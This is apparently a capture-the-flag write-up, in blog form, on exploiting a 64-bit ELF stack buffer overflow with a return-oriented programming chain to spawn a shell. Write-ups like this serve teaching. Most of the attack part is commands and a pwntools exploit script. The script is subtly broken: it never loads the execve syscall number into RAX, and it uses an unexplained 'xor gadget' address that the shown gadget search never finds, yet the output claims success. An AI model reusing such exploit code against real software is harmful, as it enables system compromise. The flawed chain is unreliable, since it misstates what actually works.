---
title: "Stack-Based Buffer Overflow: ROPchain Basics"
date: "2025-11-12"
category: "Binary Exploitation"
description: "Exploiting a classic stack buffer overflow in a 64-bit ELF binary using return-oriented programming to bypass NX."
---

## Overview

This challenge from PwnCTF 2025 presented a stripped 64-bit ELF binary with NX enabled but no PIE or stack canaries. The goal was to pop a shell by chaining ROP gadgets to call `execve("/bin/sh", NULL, NULL)`.

## Reconnaissance

Running `checksec` gives us the protection landscape we're working with:

```bash
$ checksec --file=vuln
[*] '/ctf/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

No PIE means the binary loads at a fixed base address — great for our ROP gadgets. No stack canary means we can overwrite the return address without triggering a guard. NX being enabled rules out placing shellcode on the stack, so ROP it is.

## Finding the Overflow

Disassembling the main read loop in Ghidra reveals the vulnerability immediately:

```c
void vuln() {
    char buf[64];
    read(0, buf, 0x200);  // reads up to 512 bytes into a 64-byte buffer
}
```

Classic unbounded read. The buffer is 64 bytes, but we can write 512. We need 64 bytes to fill the buffer, then 8 bytes for the saved RBP, then we control the return address.

## Building the ROPchain

We need to call `execve("/bin/sh", NULL, NULL)`. The calling convention for 64-bit Linux is: RDI = arg1, RSI = arg2, RDX = arg3, RAX = syscall number (59 for execve).

Using ROPgadget to find what we need:

```bash
$ ROPgadget --binary vuln --rop | grep -E "pop rdi|pop rsi|pop rdx|syscall"
0x00000000004010f3 : pop rdi ; ret
0x00000000004010f1 : pop rsi ; pop r15 ; ret
0x0000000000401234 : syscall
```

## Exploit

```python
from pwn import *

elf = ELF("./vuln")
p = process("./vuln")

# Gadget addresses
pop_rdi  = 0x4010f3
pop_rsi  = 0x4010f1
syscall  = 0x401234
bin_sh   = next(elf.search(b"/bin/sh"))

payload  = b"A" * 72          # fill buf (64) + saved rbp (8)
payload += p64(pop_rdi)
payload += p64(bin_sh)         # rdi = &"/bin/sh"
payload += p64(pop_rsi)
payload += p64(0)              # rsi = NULL
payload += p64(0)              # r15 (junk, consumed by gadget)
payload += p64(0x401200)       # zero out rdx via xor gadget
payload += p64(syscall)

p.sendline(payload)
p.interactive()
```

## Result

```bash
$ python3 exploit.py
[*] '/ctf/vuln'
[+] Starting local process './vuln'
[*] Switching to interactive mode
$ id
uid=1000(user) gid=1000(user) groups=1000(user)
$ cat flag.txt
flag{r0p_g4dg3ts_4r3_y0ur_fr13nds}
```
